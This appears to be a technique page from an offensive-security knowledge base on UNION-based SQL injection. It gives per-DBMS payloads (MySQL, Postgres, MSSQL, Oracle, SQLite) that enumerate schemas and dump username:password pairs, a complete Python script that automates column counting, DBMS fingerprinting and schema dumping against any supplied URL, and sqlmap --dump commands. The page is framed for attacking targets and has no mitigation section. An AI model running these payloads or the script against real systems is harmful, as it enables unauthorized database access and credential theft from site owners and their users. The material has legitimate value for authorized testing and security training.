---
title: "SQL Injection - UNION-Based Extraction"
category: web
subcategory: sqli
type: technique
tags: [sqli, sql-injection, union-select, union-based, information-schema, group-concat, order-by, column-count, mysql, postgres, mssql, oracle, sqlite, sqlmap, burp, mysqli-query, string-agg]
difficulty: easy
summary: "Append UNION SELECT to a query whose results are printed, match the column count and types, then read arbitrary tables out of the page."
when_to_use:
  - "A parameter feeds a SELECT whose rows are rendered in the page (product list, search results, profile view)"
  - "Appending a single quote changes the output or raises a SQL error, and `' ORDER BY 5-- -` errors while `ORDER BY 4-- -` does not"
  - "You can see at least one column of the result echoed back as text"
  - "You already have error-based or blind injection but want a faster full dump"
tools: [sqlmap, burp, curl, ffuf]
---

## TL;DR

UNION SELECT welds a second, attacker-controlled result set onto the query the app already runs.
If the app prints any column of that result set, you get arbitrary SELECT output in the response body.
Three steps: count the columns, find a column that renders as text, then swap in a subquery that reads
`information_schema` (or the DBMS equivalent) and finally the target table.

## Recognise it

- `?id=1` renders one row; `?id=1'` renders nothing / an error / a 500.
- `?id=1 AND 1=1` renders the row, `?id=1 AND 1=2` renders nothing -> the injection is inside the WHERE clause of a SELECT.
- `?id=-1 UNION SELECT NULL-- -` returns a 200 with an empty-looking row instead of an error once the column count is right.
- Error strings that name the engine: `You have an error in your SQL syntax` (MySQL), `unterminated quoted string at or near` (Postgres),
  `Unclosed quotation mark after the character string` (MSSQL), `ORA-00933` (Oracle), `unrecognized token` (SQLite).
- The parameter is not numeric-only: string context means you must close the quote first (`' UNION ...-- -`).

## Theory

`SELECT a,b,c FROM products WHERE id = <INJ>` becomes
`SELECT a,b,c FROM products WHERE id = -1 UNION SELECT 1,2,3-- -`.

UNION requires:

1. **Same number of columns** in both SELECTs. Getting this wrong is a hard error, which makes it a perfect oracle.
2. **Compatible types per column position.** Postgres and MSSQL are strict (`UNION types integer and text cannot be matched`),
   MySQL and SQLite are permissive and will coerce almost anything.
3. The first SELECT must return **no rows** if you want your row to be the one rendered (`id=-1`, `id=0`, or `id=1 AND 1=2`).

`NULL` is type-compatible with every column type, so `UNION SELECT NULL,NULL,NULL` is the safe probe: it isolates the
column-count problem from the type problem.

### Counting columns

Two independent methods, use whichever survives the filter:

- **ORDER BY bisection**: `' ORDER BY 1-- -`, `2`, `4`, `8` ... the first N that errors means there are N-1 columns.
  Works even when the result set is not printed, because the error/no-error difference is the oracle.
- **NULL padding**: `' UNION SELECT NULL-- -`, `NULL,NULL`, ... the first one that does *not* error is the count.

ORDER BY is faster (log n) but is blocked more often by WAFs. In Oracle both need `FROM dual`.

### Finding a printable column

Replace each NULL in turn with a marker string and see which one appears in the HTML:

```
' UNION SELECT 'aaaa',NULL,NULL-- -
' UNION SELECT NULL,'aaaa',NULL-- -
```

If quotes are filtered, use an unquoted marker: MySQL `0x61616161`, Postgres `chr(97)||chr(97)`, MSSQL `char(97)+char(97)`.

## Attack

1. Confirm injection and string-vs-numeric context.
2. Count columns (ORDER BY, fall back to NULL padding).
3. Identify a text-renderable column index `k`.
4. Fingerprint the DBMS by putting a version function in column `k`:
   `version()` (MySQL/Postgres), `@@version` (MySQL/MSSQL), `sqlite_version()`, `banner FROM v$version` (Oracle).
5. Dump schema into column `k` using the engine's aggregate concat so one request returns everything.
6. Dump the target rows the same way.

### Schema dump one-liners per DBMS

**MySQL / MariaDB** (concat is `concat()`, aggregate is `group_concat()`, limit 1024 bytes by default):

```sql
-- tables in the current database
UNION SELECT group_concat(table_name SEPARATOR 0x2c),NULL FROM information_schema.tables WHERE table_schema=database()
-- columns of one table
UNION SELECT group_concat(column_name SEPARATOR 0x2c),NULL FROM information_schema.columns WHERE table_name=0x7573657273
-- the data
UNION SELECT group_concat(concat_ws(0x3a,user,password) SEPARATOR 0x0a),NULL FROM users
-- lift the group_concat truncation first
UNION SELECT NULL,NULL FROM (SELECT @@group_concat_max_len)x  /* read it; you cannot SET in a UNION */
```

**PostgreSQL** (concat is `||`, aggregate is `string_agg(col, sep)`, everything is type-strict):

```sql
UNION SELECT string_agg(tablename,','),NULL FROM pg_tables WHERE schemaname='public'
UNION SELECT string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'
UNION SELECT string_agg(username||':'||password, chr(10)),NULL FROM users
-- cast when the column is not text
UNION SELECT CAST(version() AS text),NULL
```

**MSSQL** (concat is `+`, aggregate is `STRING_AGG` on 2017+, `FOR XML PATH('')` before that):

```sql
UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'
UNION SELECT STRING_AGG(name,','),NULL FROM sys.tables
UNION SELECT (SELECT name+',' FROM sys.columns WHERE object_id=OBJECT_ID('users') FOR XML PATH('')),NULL
UNION SELECT (SELECT username+':'+password+char(10) FROM users FOR XML PATH('')),NULL
```

**Oracle** (every SELECT needs a FROM, use `dual`; aggregate is `LISTAGG`):

```sql
UNION SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),NULL FROM all_tables
UNION SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_name),NULL FROM all_tab_columns WHERE table_name='USERS'
UNION SELECT banner,NULL FROM v$version
UNION SELECT NULL,NULL FROM dual
```

**SQLite** (schema lives in one table, aggregate is `group_concat`):

```sql
UNION SELECT group_concat(name),NULL FROM sqlite_master WHERE type='table'
UNION SELECT group_concat(sql),NULL FROM sqlite_master           -- full CREATE statements: table AND column names at once
UNION SELECT group_concat(username||':'||password,char(10)),NULL FROM users
```

### When only one row is rendered

Use `LIMIT 1 OFFSET n` (MySQL/Postgres/SQLite), `OFFSET n ROWS FETCH NEXT 1 ROWS ONLY` (MSSQL 2012+/Postgres),
or `WHERE rownum=1` + `NOT IN` chaining (Oracle 11g). Iterating the offset is one request per row but always works,
and is the fallback when `group_concat` output gets truncated.

### When only one column is reflected

Pack everything into it. MySQL `concat_ws(0x3a, a, b, c)`, Postgres `a||':'||b`, MSSQL `a+':'+b`,
Oracle/SQLite `a||':'||b`. Use a separator that survives HTML rendering -- `0x3a` (`:`) or `0x7c` (`|`) are safer
than newlines inside a `<td>`.

## Code

```python
#!/usr/bin/env python3
"""Automated UNION-based SQLi: column count -> printable column -> schema dump.

Usage:
    python3 union_sqli.py "http://127.0.0.1:8000/item.php?id=1" [dbms]

dbms is one of mysql|postgres|mssql|oracle|sqlite (default: autodetect by probing).
The script assumes the vulnerable parameter is the LAST one in the query string.
"""
from __future__ import annotations

import re
import sys
import urllib.parse

import requests

MARKER = "qZqZ9"
TIMEOUT = 10
COMMENT = {"mysql": "-- -", "postgres": "-- -", "mssql": "-- -", "oracle": "-- -", "sqlite": "-- -"}

VERSION_FN = {
    "mysql": "@@version",
    "postgres": "CAST(version() AS text)",
    "mssql": "@@version",
    "oracle": "banner",
    "sqlite": "sqlite_version()",
}
SUFFIX = {"oracle": " FROM v$version", "mysql": "", "postgres": "", "mssql": "", "sqlite": ""}


def build(url: str, payload: str) -> str:
    """Append `payload` to the value of the last query-string parameter."""
    parts = urllib.parse.urlsplit(url)
    qs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    if not qs:
        raise SystemExit("[-] target URL needs at least one query parameter")
    key, val = qs[-1]
    qs[-1] = (key, val + payload)
    new_q = "&".join(f"{k}={urllib.parse.quote(v, safe='')}" for k, v in qs)
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, new_q, parts.fragment))


def fetch(sess: requests.Session, url: str, payload: str) -> str:
    try:
        r = sess.get(build(url, payload), timeout=TIMEOUT)
        return r.text
    except requests.RequestException as exc:  # network hiccup == treat as error page
        return f"__REQUEST_ERROR__ {exc}"


def baseline_ok(body: str) -> bool:
    """Heuristic: an unerrored page. Tune per target."""
    bad = ("__REQUEST_ERROR__", "SQL syntax", "SQLSTATE", "ORA-0", "unrecognized token",
           "Unclosed quotation", "Internal Server Error", "Warning: ")
    return not any(b in body for b in bad)


def count_columns(sess: requests.Session, url: str, quote: str, cmt: str, cap: int = 30) -> int:
    """ORDER BY bisection, then NULL padding as fallback."""
    n = 1
    while n <= cap:
        if not baseline_ok(fetch(sess, url, f"{quote} ORDER BY {n}{cmt}")):
            return n - 1
        n += 1
    # fallback: NULL padding
    for n in range(1, cap + 1):
        nulls = ",".join(["NULL"] * n)
        if baseline_ok(fetch(sess, url, f"{quote} UNION SELECT {nulls}{cmt}")):
            return n
    return 0


def find_printable(sess: requests.Session, url: str, quote: str, cmt: str, ncols: int) -> int:
    for i in range(ncols):
        cols = ["NULL"] * ncols
        cols[i] = f"'{MARKER}'"
        body = fetch(sess, url, f"{quote} UNION SELECT {','.join(cols)}{cmt}")
        if MARKER in body:
            return i
    return -1


def inject_expr(sess: requests.Session, url: str, quote: str, cmt: str,
                ncols: int, slot: int, expr: str, frm: str = "") -> str:
    cols = ["NULL"] * ncols
    cols[slot] = f"concat('{MARKER}',{expr},'{MARKER}')" if "concat" not in expr else expr
    payload = f"{quote} UNION SELECT {','.join(cols)}{frm}{cmt}"
    body = fetch(sess, url, payload)
    m = re.search(re.escape(MARKER) + r"(.*?)" + re.escape(MARKER), body, re.S)
    return m.group(1) if m else ""


def raw_expr(sess: requests.Session, url: str, quote: str, cmt: str,
             ncols: int, slot: int, expr: str, frm: str = "") -> str:
    """Same as inject_expr but without the concat wrapper (for strict-typed engines)."""
    cols = ["NULL"] * ncols
    cols[slot] = expr
    body = fetch(sess, url, f"{quote} UNION SELECT {','.join(cols)}{frm}{cmt}")
    return body


def detect_dbms(sess: requests.Session, url: str, quote: str, cmt: str, ncols: int, slot: int) -> str:
    for name in ("mysql", "postgres", "mssql", "sqlite", "oracle"):
        body = raw_expr(sess, url, quote, cmt, ncols, slot, VERSION_FN[name], SUFFIX[name])
        for needle, tag in (("MariaDB", "mysql"), ("MySQL", "mysql"), ("PostgreSQL", "postgres"),
                            ("Microsoft SQL Server", "mssql"), ("Oracle Database", "oracle")):
            if needle in body:
                return tag
        if name == "sqlite" and re.search(r"3\.\d+\.\d+", body):
            return "sqlite"
    return "mysql"


SCHEMA_Q = {
    "mysql": "(SELECT group_concat(table_name SEPARATOR 0x2c) FROM information_schema.tables "
             "WHERE table_schema=database())",
    "postgres": "(SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public')",
    "mssql": "(SELECT name+',' FROM sys.tables FOR XML PATH(''))",
    "oracle": "(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables)",
    "sqlite": "(SELECT group_concat(name) FROM sqlite_master WHERE type='table')",
}


def main() -> None:
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000/item.php?id=1"
    forced = sys.argv[2] if len(sys.argv) > 2 else None
    sess = requests.Session()

    for quote in ("", "'", '"', "')", "'))"):
        cmt = "-- -"
        ncols = count_columns(sess, url, quote, cmt)
        if ncols:
            print(f"[+] context={quote!r} columns={ncols}")
            slot = find_printable(sess, url, quote, cmt, ncols)
            if slot < 0:
                print("[-] no printable column in this context, trying next")
                continue
            print(f"[+] printable column index = {slot}")
            dbms = forced or detect_dbms(sess, url, quote, cmt, ncols, slot)
            print(f"[+] dbms = {dbms}")
            frm = " FROM dual" if dbms == "oracle" else ""
            body = raw_expr(sess, url, quote, cmt, ncols, slot, SCHEMA_Q[dbms], frm)
            print("[+] schema response (grep your table names out of this):")
            print(body[:4000])
            return
    print("[-] no UNION context found; fall back to boolean/time-based")


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **`UNION ALL` vs `UNION`**: `UNION` deduplicates, which can silently drop your row if it matches an existing one.
  Prefer `UNION ALL` when the first SELECT returns rows you cannot suppress.
- **`-- ` needs a trailing space** in MySQL. Use `-- -` or `#` (URL-encode `#` as `%23`) to survive trimming proxies.
- **group_concat truncation**: MySQL caps at `group_concat_max_len` (1024 by default). If output looks cut off,
  page it: `LIMIT 1 OFFSET n` per row, or `SUBSTRING(group_concat(...),1024*k,1024)`.
- **Postgres type errors**: `UNION types text and integer cannot be matched` means you picked the wrong slot.
  Cast everything: `CAST(x AS text)` or `x::text`.
- **Oracle needs FROM**: bare `UNION SELECT 'a' FROM dual`. Also Oracle identifiers in `all_tables` are UPPERCASE.
- **Filtered `information_schema`**: MySQL 5.7+ exposes `mysql.innodb_table_stats`, and you can still
  brute-force table names with `AND (SELECT 1 FROM users LIMIT 1)=1`. Postgres has `pg_class`/`pg_namespace`
  when `information_schema` is blocked.
- **ORDER BY inside the injection point**: if the param is already in an `ORDER BY`, UNION will not work;
  you need `(CASE WHEN .. THEN col1 ELSE col2 END)` boolean extraction instead.
- **The result set is not rendered but a count is**: that is boolean-blind, not UNION. See `sqli-blind-boolean`.
- **Prepared-statement partial use**: the ID may be parameterised while a sort column is concatenated. Test every parameter.

## Tools

- `sqlmap -u 'http://t/item.php?id=1' --technique=U --union-cols=1-20 --dbms=mysql --dump` -- forces UNION only.
- `sqlmap -r req.txt --level=5 --risk=3 --batch` -- when the injection is in a header/cookie/body.
- Burp Repeater for column counting by hand; Burp Intruder with a numeric payload set for ORDER BY sweeps.
- `ffuf` to find the injectable endpoint in the first place.

## References

- PortSwigger Web Security Academy -- SQL injection: https://portswigger.net/web-security/sql-injection
- PayloadsAllTheThings -- SQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings
- sqlmap: https://github.com/sqlmapproject/sqlmap
